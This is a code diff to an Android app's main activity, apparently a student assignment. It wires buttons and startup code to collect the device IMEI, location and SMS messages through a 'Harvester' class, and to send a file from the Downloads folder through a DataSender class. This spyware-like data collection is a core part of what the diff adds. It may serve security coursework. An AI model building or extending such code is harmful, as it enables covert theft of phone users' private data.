@@ -4,7 +4,6 @@ import android.content.Intent
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.os.StrictMode
-import android.util.Log
 import android.view.View
 import android.widget.TextView
 import com.example.assignment1.DataRetriever.FindLocation
@@ -17,6 +16,9 @@ class MainActivity : AppCompatActivity() {
         // Initialise dataSender class
         var dataSender = DataSender();
 
+        // Set IMEI
+        dataSender.obtainIMEI(this.contentResolver)
+
         // Initialise data retriever
         // Need this to allow finding of public IP
         val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
@@ -26,15 +28,18 @@ class MainActivity : AppCompatActivity() {
         // Initialize location
         val gps = FindLocation(this, this)
 
+        // Initialize harvester
+        val hv = Harvester(this, this, dataSender.getIMEI())
+
         setContentView(R.layout.activity_main)
         findViewById<TextView>(R.id.mengrong).setOnClickListener{
-            dataSender.getIMEI(this.contentResolver)
         }
         findViewById<TextView>(R.id.wesley).setOnClickListener{
             dataSender.sendFile("/storage/emulated/0/Downloads/test.txt")
         }
         findViewById<TextView>(R.id.jon).setOnClickListener{
-            dataSender.sendData(dataSender.getIMEI(this.contentResolver), gps.getLocationDetails())
+            hv.getSMS()
+            //dataSender.sendData(dataSender.getIMEI(this.contentResolver), gps.getLocationDetails())
         }
         findViewById<TextView>(R.id.keefe).setOnClickListener(::clickName)
         findViewById<TextView>(R.id.minyao).setOnClickListener(::clickName)
